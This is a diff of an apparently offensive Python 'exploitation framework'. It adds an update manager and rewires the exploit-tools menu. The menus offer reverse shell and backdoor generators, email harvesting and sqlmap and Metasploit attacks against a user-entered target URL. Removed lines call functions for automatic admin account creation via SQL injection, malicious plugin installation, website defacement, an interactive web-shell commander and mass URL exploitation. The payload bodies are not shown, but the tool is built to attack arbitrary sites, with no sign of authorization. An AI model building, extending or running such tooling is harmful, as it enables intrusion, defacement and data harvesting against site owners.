+                                      0101       01     010101010101                                  
+                                       0101010             0101010 0                                  
+                                          01010      01       01                                      
+                                           01010101010    01                                          
+                                             01010101   010                                          
+                                               01 0101  01                                            
+                                                   010                                                 
+                                                    0                                                
 {Fore.GREEN} ___  _   _  _____  ___  ____  _    _    __    ____ 
  / __)( )_( )(  _  )/ __)(_  _)( \\/\\/ )  /__\\  (  _ \\
 ( (_-. ) _ (  )(_)( \\__ \\  )(   )    (  /(__)\\  )   /
@@ -2995,6 +3569,7 @@ def print_main_menu():
 
 {Fore.CYAN}════════════════════════════════════════════════════════════════
 {Fore.YELLOW}              MAIN MENU - EXPLOITATION FRAMEWORK
+{Fore.YELLOW}              Version: {CURRENT_VERSION} | GitHub: github.com/{GITHUB_REPO.split('/')[1]}
 {Fore.CYAN}════════════════════════════════════════════════════════════════
 
 {Fore.GREEN}[1] Full Scan (Recommended)
@@ -3003,6 +3578,7 @@ def print_main_menu():
 {Fore.GREEN}[4] Brute Force Attack (Manual target)
 {Fore.GREEN}[5] Create Wordlist
 {Fore.GREEN}[6] Exploit Tools
+{Fore.GREEN}[7] Update Manager
 {Fore.GREEN}[0] Exit
 
 {Fore.CYAN}════════════════════════════════════════════════════════════════
@@ -3019,15 +3595,10 @@ def exploit_tools_menu():
         
         print(f"{Fore.GREEN}[1] Reverse Shell Generator")
         print(f"{Fore.GREEN}[2] Backdoor Generator")
-        print(f"{Fore.GREEN}[3] Hash Cracker (Dictionary Attack)")
-        print(f"{Fore.GREEN}[4] WordPress Exploit Pack")
-        print(f"{Fore.GREEN}[5] Privilege Escalation Checker")
-        print(f"{Fore.GREEN}[6] Auto Admin Account Creator")
-        print(f"{Fore.GREEN}[7] Malicious Plugin Generator")
-        print(f"{Fore.GREEN}[8] Website Defacer")
-        print(f"{Fore.GREEN}[9] Email Harvester")
-        print(f"{Fore.GREEN}[10] Interactive Shell Commander")
-        print(f"{Fore.GREEN}[11] Mass URL Exploiter")
+        print(f"{Fore.GREEN}[3] Email Harvester")
+        print(f"{Fore.GREEN}[4] Nmap Port Scanner")
+        print(f"{Fore.GREEN}[5] SQLmap SQL Injection")
+        print(f"{Fore.GREEN}[6] Metasploit Exploit Generator")
         print(f"{Fore.GREEN}[0] Back to Main Menu")
         
         choice = input(f"\n{Fore.YELLOW}Choice: ").strip()
@@ -3041,43 +3612,31 @@ def exploit_tools_menu():
             scanner = AdvancedScanner("http://localhost")
             scanner.generate_backdoor()
         elif choice == '3':
-            hash_cracker()
+            target = input(f"\n{Fore.YELLOW}Enter target URL: ").strip()
+            if target:
+                if not target.startswith(('http://', 'https://')):
+                    target = 'http://' + target
+                scanner = AdvancedScanner(target)
+                print(f"{Fore.CYAN}[*] Crawling website to extract emails...")
+                urls, _ = scanner.crawl_site(max_pages=50)
+                scanner.extract_all_emails(urls)
         elif choice == '4':
-            wordpress_exploit_pack()
+            target = input(f"\n{Fore.YELLOW}Enter target (domain or IP): ").strip()
+            if target:
+                scanner = AdvancedScanner(f"http://{target}")
+                scanner.run_nmap_scan()
         elif choice == '5':
-            privilege_escalation_check()
+            target = input(f"\n{Fore.YELLOW}Enter target URL with parameter: ").strip()
+            if target:
+                scanner = AdvancedScanner(target)
+                vuln = {'url': target, 'type': 'SQL Injection'}
+                scanner.run_sqlmap_attack(vuln)
         elif choice == '6':
             target = input(f"\n{Fore.YELLOW}Enter target URL: ").strip()
             if target:
                 scanner = AdvancedScanner(target)
-                # Need SQL injection vuln
-                vuln = {'url': target, 'payload': ''}
-                scanner.auto_create_admin_account(vuln)
-        elif choice == '7':
-            target = input(f"\n{Fore.YELLOW}Enter target URL: ").strip()
-            if target:
-                scanner = AdvancedScanner(target)
-                scanner.auto_install_malicious_plugin()
-        elif choice == '8':
-            shell_url = input(f"\n{Fore.YELLOW}Enter shell URL: ").strip()
-            if shell_url:
-                scanner = AdvancedScanner("http://localhost")
-                scanner.auto_deface_website(shell_url)
-        elif choice == '9':
-            target = input(f"\n{Fore.YELLOW}Enter target URL: ").strip()
-            if target:
-                scanner = AdvancedScanner(target)
-                urls, _ = scanner.crawl_site(max_pages=30)
-                scanner.extract_all_emails(urls)
-        elif choice == '10':
-            shell_url = input(f"\n{Fore.YELLOW}Enter shell URL: ").strip()
-            if shell_url:
-                scanner = AdvancedScanner("http://localhost")
-                scanner.interactive_shell_commander(shell_url)
-        elif choice == '11':
-            url_file = input(f"\n{Fore.YELLOW}Enter URL list file: ").strip() or 'urls.txt'
-            scanner = AdvancedScanner("http://localhost")
-            scanner.mass_exploit_urls(url_file)
+                vuln = {'url': target, 'type': 'General'}
+                scanner.run_metasploit_exploit(vuln)
         else:
             print(f"{Fore.RED}[-] Invalid choice!")
         
@@ -3473,6 +4032,14 @@ def custom_scan(target):
 def main():
     """Main program"""
     try:
+        # Check for updates on startup (optional)
+        print(f"{Fore.YELLOW}[*] Checking for updates...")
+        update_available, latest = check_for_updates()
+        if update_available:
+            print(f"\n{Fore.GREEN}[!] New version {latest} is available!")
+            print(f"{Fore.YELLOW}[*] Go to [7] Update Manager to install\n")
+            time.sleep(2)
+        
         while True:
             print_main_menu()
             
@@ -3515,6 +4082,9 @@ def main():
             
             elif choice == '6':
                 exploit_tools_menu()
+            
+            elif choice == '7':
+                update_menu()
             
             else:
                 print(f"{Fore.RED}[-] Invalid choice!")
